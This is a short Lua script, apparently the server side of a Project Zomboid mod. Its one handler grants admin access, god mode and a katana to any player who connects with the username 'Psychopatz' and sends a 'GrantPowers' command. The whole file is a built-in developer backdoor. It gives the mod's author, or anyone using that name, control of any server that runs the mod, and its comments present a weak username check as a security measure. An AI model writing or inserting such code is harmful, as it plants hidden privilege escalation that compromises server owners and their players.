-- Define the command handler
local function onPsychopatzCommand(module, command, player, args)
    -- 1. Filter for our specific Module
    if module ~= "Psychopatz" then return end

    -- 2. Filter for our specific Command
    if command == "GrantPowers" then
        
        -- SECURITY CHECK (Crucial):
        -- Even though the client checked, the SERVER must verify the username again.
        -- Never trust data coming from the client blindly.
        if player:getUsername() ~= "Psychopatz" then 
            print("Psychopatz Mod Warning: Unauthorized user tried to trigger commands: " .. tostring(player:getUsername()))
            return 
        end

        print("Developer Access: Received request from " .. player:getUsername())
        print("Developer Access: Granting Admin...")
            
        -- This function runs on the server, so it actually updates the database/permissions
        player:setAccessLevel("admin")
        player:setGodMod(true)
            
        -- Force a database save for the player (good practice in MP)
        sendPlayerExtraInfo(player) 

        -- LOGIC 2: Give Katana
        print("Developer Access: Granting Katana...")
        
        -- Server adds item to player inventory
        local item = player:getInventory():AddItem("Base.Katana")
        
        -- Depending on how B42 handles sync, we might need to force a sync, 
        -- but usually AddItem on server side automatically syncs to client.
        -- If the item doesn't appear, B42 might require:
        -- sendAddItemToContainer(player:getInventory(), item)
    end
end

-- Register the command listener
Events.OnClientCommand.Add(onPsychopatzCommand)